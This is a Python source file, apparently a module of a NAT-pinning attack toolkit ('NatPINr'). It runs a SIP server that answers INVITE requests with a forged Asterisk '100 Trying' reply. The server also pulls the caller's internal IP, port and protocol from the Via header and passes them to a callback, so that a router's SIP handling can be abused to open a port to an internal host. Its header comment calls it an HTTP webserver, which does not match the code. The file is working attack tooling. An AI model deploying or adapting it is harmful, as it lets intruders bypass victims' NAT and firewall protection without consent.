#!/usr/bin/env python
#filename=web.py
#This module acts as a very simple HTTP webserver and will feed the exploit page.

from base import *
import socket
import random
import struct
import select
import time

class SIPProtoHandler(asyncore.dispatcher_with_send):
	SIP_RINGING =""
	def __init__(self,conn_sock, client_address, server):
		global SIP_RINGING
		SIP_RINGING="""SIP/2.0 100 Trying
$via$
From: "NatPINr" ;tag=eihgg
To: 
Call-ID: hfxsabthoymshub@backtrack
CSeq: 650 INVITE 

User-Agent: Asterisk PBX
Allow: INVITE, ACK, CANCEL, OPTIONS, BYE, REFER, SUBSCRIBE, NOTIFY 

Supported: replaces
Contact: 
Content-Length: 0

"""
		self.server=server
		asyncore.dispatcher_with_send.__init__(self,conn_sock) #Line is required
		self.server.log("Received connection from " + client_address[0] + ' on port ' + str(self.server.sPort))
	def handle_read(self):
		global SIP_RINGING
		data = self.recv(1024)
		if data !="":
			via = ""
			lines = data.split("\n")
			for line in lines:
				if "Via:" in line:
					via = line.strip()
					#Via: SIP/2.0/TCP 192.168.2.126:5060;branch=z9hG4bKbc9531bb-0dbb-e211-9afc-60672051a506;rport
					via_data = line.split(" ")
					proto = via_data[1].split("/")[2]
					callback = via_data[2].split(";")[0]
					numip = callback.split(":")[0]
					numport= callback.split(":")[1]
			if via != "":
				resp_ring = SIP_RINGING
				resp_ring = resp_ring.replace("$via$",via)
				self.send(resp_ring)
				self.server.log("SIP Invite for " + numip + ", port " + str(numport) + "("+proto +")")
				self.server.callback("SELF", self.server.CB_TYPE,numip,int(numport))
#end class

class Server(Base):
	def __init__(self,serverPort=843,sCallbackType="socket", verbose=False):
		self.TYPE = "SIP Server"
		self.EXIT_ON_CB = 1
		self.CB_TYPE=sCallbackType
		Base.__init__(self,"TCP",serverPort,sCallbackType,verbose)
		self.log("Started")
	#end def
	def protocolhandler(self,conn, addr):
		self.HANDLER = SIPProtoHandler(conn,addr,self)
	#end def
#end class
